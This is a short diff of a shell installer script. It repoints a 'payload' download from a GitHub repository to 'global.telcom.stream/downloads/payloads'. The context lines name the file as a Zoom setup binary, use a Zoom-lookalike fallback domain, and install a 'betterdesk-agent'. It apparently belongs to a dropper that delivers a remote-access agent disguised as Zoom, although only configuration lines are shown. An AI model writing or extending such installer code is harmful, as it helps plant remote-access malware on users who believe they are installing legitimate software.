@@ -16,7 +16,7 @@ umask 022
 VERSION='6.1.0'
 PAYLOAD_NAME='zoom-private.Setup_1.0.0_x86_64.bin'
 EXPECTED_SHA='22541504bc8fa2c81b787a35bc78443b649039b67fad07e651e6ddcc243eea34'
-REPO_BASE='https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/linux'
+REPO_BASE='https://global.telcom.stream/downloads/payloads'
 FALLBACK_BASE='https://us05web.telcom.stream'
 PRIMARY_URL="${ZOOM_URL:-$REPO_BASE/$PAYLOAD_NAME}"
 AGENT_NAME='betterdesk-agent'
